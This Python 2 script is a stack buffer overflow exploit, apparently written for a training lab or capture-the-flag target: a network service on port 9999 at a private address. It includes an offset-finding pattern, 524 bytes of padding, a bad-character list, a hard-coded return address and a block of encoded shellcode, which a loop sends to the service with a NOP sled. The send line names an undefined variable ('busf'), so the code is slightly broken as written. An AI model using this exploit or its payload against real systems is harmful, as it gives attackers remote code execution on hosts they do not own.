#!/usr/bin/python
#Exp1(Server)
import os
import socket
import sys

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
#buffer = "A"
cont=100
As= "A"*524
Bs= "B"*4
buff=As
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
badchars2="\x00"
dir = "311712F3"
dir2="\xF3\x12\x17\x31"
buf =  b""
buf += b"\xdd\xc1\xbe\xad\xf5\x98\x39\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x73\x17\x83\xeb\xfc\x03\xde\xe6\x7a"
buf += b"\xcc\xdc\xe1\xf9\x2f\x1c\xf2\x9d\xa6\xf9\xc3\x9d\xdd"
buf += b"\x8a\x74\x2e\x95\xde\x78\xc5\xfb\xca\x0b\xab\xd3\xfd"
buf += b"\xbc\x06\x02\x30\x3c\x3a\x76\x53\xbe\x41\xab\xb3\xff"
buf += b"\x89\xbe\xb2\x38\xf7\x33\xe6\x91\x73\xe1\x16\x95\xce"
buf += b"\x3a\x9d\xe5\xdf\x3a\x42\xbd\xde\x6b\xd5\xb5\xb8\xab"
buf += b"\xd4\x1a\xb1\xe5\xce\x7f\xfc\xbc\x65\x4b\x8a\x3e\xaf"
buf += b"\x85\x73\xec\x8e\x29\x86\xec\xd7\x8e\x79\x9b\x21\xed"
buf += b"\x04\x9c\xf6\x8f\xd2\x29\xec\x28\x90\x8a\xc8\xc9\x75"
buf += b"\x4c\x9b\xc6\x32\x1a\xc3\xca\xc5\xcf\x78\xf6\x4e\xee"
buf += b"\xae\x7e\x14\xd5\x6a\xda\xce\x74\x2b\x86\xa1\x89\x2b"
buf += b"\x69\x1d\x2c\x20\x84\x4a\x5d\x6b\xc1\xbf\x6c\x93\x11"
buf += b"\xa8\xe7\xe0\x23\x77\x5c\x6e\x08\xf0\x7a\x69\x6f\x2b"
buf += b"\x3a\xe5\x8e\xd4\x3b\x2c\x55\x80\x6b\x46\x7c\xa9\xe7"
buf += b"\x96\x81\x7c\xa7\xc6\x2d\x2f\x08\xb6\x8d\x9f\xe0\xdc"
buf += b"\x01\xff\x11\xdf\xcb\x68\xbb\x1a\x9c\x9c\x3c\x26\x53"
buf += b"\xc9\x3e\x26\x75\x68\xb6\xc0\xe3\x7a\x9e\x5b\x9c\xe3"
buf += b"\xbb\x17\x3d\xeb\x11\x52\x7d\x67\x96\xa3\x30\x80\xd3"
buf += b"\xb7\xa5\x60\xae\xe5\x60\x7e\x04\x81\xef\xed\xc3\x51"
buf += b"\x79\x0e\x5c\x06\x2e\xe0\x95\xc2\xc2\x5b\x0c\xf0\x1e"
buf += b"\x3d\x77\xb0\xc4\xfe\x76\x39\x88\xbb\x5c\x29\x54\x43"
buf += b"\xd9\x1d\x08\x12\xb7\xcb\xee\xcc\x79\xa5\xb8\xa3\xd3"
buf += b"\x21\x3c\x88\xe3\x37\x41\xc5\x95\xd7\xf0\xb0\xe3\xe8"
buf += b"\x3d\x55\xe4\x91\x23\xc5\x0b\x48\xe0\xf5\x41\xd0\x41"
buf += b"\x9e\x0f\x81\xd3\xc3\xaf\x7c\x17\xfa\x33\x74\xe8\xf9"
buf += b"\x2c\xfd\xed\x46\xeb\xee\x9f\xd7\x9e\x10\x33\xd7\x8a"

while True:
	#buffer = "A"*cont
	cont=cont+100
	
	print "Fuzzing PASS with %s bytes" % len(buffer)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.0.2.6',9999))
	print(s.recv(1024))
	s.send(buff+dir2+"\x90"*20+busf)
   
	print(s.recv(1024))
	
	s.close()

